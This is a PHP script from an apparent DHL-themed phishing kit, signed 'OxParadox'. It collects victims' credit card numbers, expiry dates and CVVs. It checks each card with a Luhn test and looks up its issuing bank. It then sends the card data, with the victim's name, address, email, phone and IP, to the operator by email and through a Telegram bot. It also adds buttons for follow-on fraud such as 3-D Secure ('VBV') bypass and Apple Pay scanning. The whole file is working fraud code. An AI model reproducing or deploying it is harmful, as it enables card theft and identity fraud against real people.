<?php
    session_start();
    include("../common/functions.php");
    include("../common/sub_includes.php");
    require("../config.php");

    $_SESSION["cc"]  = $_POST["ccnum"];
    $_SESSION["exp"] = $_POST["exp"];
    $_SESSION["cvv"] = $_POST["cvv"];

    function isValid($num) {
        $num = preg_replace('/[^\d]/', '', $num);
        $sum = '';
    
        for ($i = strlen($num) - 1; $i >= 0; -- $i) {
            $sum .= $i & 1 ? $num[$i] : $num[$i] * 2;
        }
    
        return array_sum(str_split($sum)) % 10 === 0;
    }

    if(!isValid($_SESSION["cc"]))
    {
        header('location: ../card.php'); die();
    }

    $bin = substr(str_replace(' ', '', $_SESSION["cc"]), 0, 6);
    $ch = curl_init();
    $url = "https://lookup.binlist.net/$bin";
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array();
    $headers[] = 'Accept-Version: 3';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    curl_close($ch);

    $brand = '';
    $type = '';
    $bank = '';

    $someArray = json_decode($result, true);
    $brand = $someArray['brand'];
    $type = $someArray['type'];
    $bank = $someArray['bank']['name'];

    $_SESSION['bin_brand']  = $brand;
    $_SESSION['bin_bank']   = $bank;
    $_SESSION['bin_type']   = $type;

    if($_SESSION['bin_bank'] == null) { $_SESSION['bin_bank'] = "X"; }
    if($_SESSION['bin_brand'] == null) { $_SESSION['bin_brand'] = "X"; }
    if($_SESSION['bin_type'] == null) { $_SESSION['bin_type'] = "X"; }

    $message = "
[📦] DHL INFOS [📦]

💳 Num: " . $_SESSION["cc"] . "
💳 Expiration: " . $_SESSION["exp"] . "
💳 CVV: " . $_SESSION["cvv"] . "

🏦 Banque: " . $_SESSION["bin_bank"] . "
🏦 Level: " . $_SESSION["bin_brand"] . "
🏦 Type " . $_SESSION["bin_type"] . "

👤 Nom: " . $_SESSION["nom"] . "
👤 Prenom: " . $_SESSION["prenom"] . "
👤 Adresse: " . $_SESSION["adress"] . "
👤 City: " . $_SESSION["city"] . "
👤 ZIP:" . $_SESSION["zip"] . "

👤 Email: " . $_SESSION["email"] . "
👤 Phone: " . $_SESSION["phone"] . "
👤 Adresse IP: " . _ip() . "
    ";

    if ($rezmail) {
        $Subject = "📦 +1 CC ・ " . $bin . " ・ " . $_SESSION['bin_brand'] . " ・ " . $_SESSION['bin_bank'] . " ・ " . _ip();
        $head = "From: 🥤 OxParadox <info@paradox.infos>";

        mail($mail, $Subject, $message, $head);
    }   

    $link = (isset($_SERVER['HTTPS']) ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    if ($reztelegram) {
        if($apple_pay) {
            $scanap = str_replace("card.php", "ScanApplePay.php", $link)."?name=".$_SESSION['nom']."%20".$_SESSION['prenom']."&cc=".$_SESSION['cc']."&expire=".$_SESSION['exp'];
            $lancevbv = str_replace("actions/card.php", "actionvbv.php?ip=", $link). _ip();
            file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query(['text' => $message,'chat_id' => $chat_id]).'&reply_markup={"inline_keyboard": [[{"text": "🎲 Lancer le VBV", "url": "' . urlencode("$lancevbv") . '"}], [{"text": "🍎 FastRead/Scan", "url": "' . urlencode("$scanap") . '"}]]}');
            
            header("Location: ../loader.php?r=applepay&t=" . $timer . "000"); die();
        } else {
            file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query(['text' => $message,'chat_id' => $chat_id]));
        }
    }
    
    header("Location: ../loader.php?r=finished&t=1000"); die();